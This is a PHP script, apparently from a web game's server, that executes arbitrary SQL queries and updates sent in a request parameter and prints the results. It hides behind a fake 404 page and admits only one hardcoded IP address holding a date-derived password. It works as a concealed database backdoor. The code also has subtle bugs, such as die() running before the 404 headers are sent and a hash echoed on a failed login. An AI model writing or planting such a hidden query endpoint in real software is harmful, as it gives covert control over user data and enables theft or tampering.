<?php
function e404($str)
{
	die($str);
	header('HTTP/1.1 404 Not Found');
	header("status: 404 Not Found");
	?><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL <?php echo $_SERVER['PHP_SELF']; ?> was not found on this server.</p>
</body></html>
<?php
	exit();
}

function checkSQL($sql)
{
	$sql = trim($sql);
	$matched = preg_match("/^(select|replace|update|delete|alter|insert).*$/i",$sql,$out);
	if($matched || freeSql)
	{
		$op = $matched ? strtolower($out[1]) : strtolower(strtok($sql, " \t\r\n"));
		if( ($op=='select'||$op=='update'||$op=='delete'||$op=='delete')&&!preg_match("/limit \d+(,\d+)?;?$/i",$sql,$out1)&&!freeSql)
		{
			return false;
		}
		return array($op,$sql);
	}else{
		return false;
	}
}

if($_SERVER['REMOTE_ADDR']!=='125.69.81.43'){
	e404($_SERVER['REMOTE_ADDR']);
}
$requestPassword = (isset($_REQUEST['p']) && !is_array($_REQUEST['p'])) ? $_REQUEST['p'] : '';
$requestData = (isset($_REQUEST['d']) && !is_array($_REQUEST['d'])) ? $_REQUEST['d'] : '';
$requestFree = (isset($_GET['f']) && !is_array($_GET['f'])) ? $_GET['f'] : '';
if($requestPassword!==md5(date("Y/n/j")."((*^TV%&Ljty4#I6698)(*%(*IOU)("))
{
	e404(md5(date("m/d/Y")."((*^TV%&Ljty4#I6698)(*%(*IOU)(").'=='.$requestPassword);
}

define("freeSql",
$requestFree==md5(
									date("Y/n/j")."2I6698FrC$64(*%(*%35IOU)("
									)
								?true:false);
ini_set('display_errors','off');
//error_reporting(E_ALL);
require('../config/config.game.php');

//$conn=mysql_connect($_mysql['host'], $_mysql['user'], $_mysql['pass']) or     die("Could not connect: " . mysql_error());
//mysql_select_db($_mysql['db']	,$conn) or die("Could not connect: " . mysql_error());

if($requestData === '') e404('');
$sqls = explode("\r\n",$requestData);
foreach($sqls as $rawSql)
{
	$sql = checkSQL($rawSql);
	if($sql===false)
	{
		echo "²»ÔÊÐíÖ´ÐÐ£º".$rawSql."!\r\n";
	}
	else
	{
		if(strtolower($sql[0])=='select')
		{
			$rs = $_pm['mysql']->getRecords($sql[1]);
			if($err=mysql_error())
			{
				echo $sql[1].":".$err."\r\n";
			}else if(!is_array($rs)){
				echo $sql[1].":query failed\r\n";
			}else{
				foreach($rs as $r)
				{
					foreach($r as $f)
					{
						echo $f."\t";
					}
					echo "\r\n";
				}
			}
		}
		else
		{
			$_pm['mysql']->query($sql[1]);
			if($err=mysql_error())
			{
				echo $sql[1].":".$err."\r\n";
			}else{
				echo mysql_affected_rows($_pm['mysql']->getConn());
			}
		}
	}
}
?> OK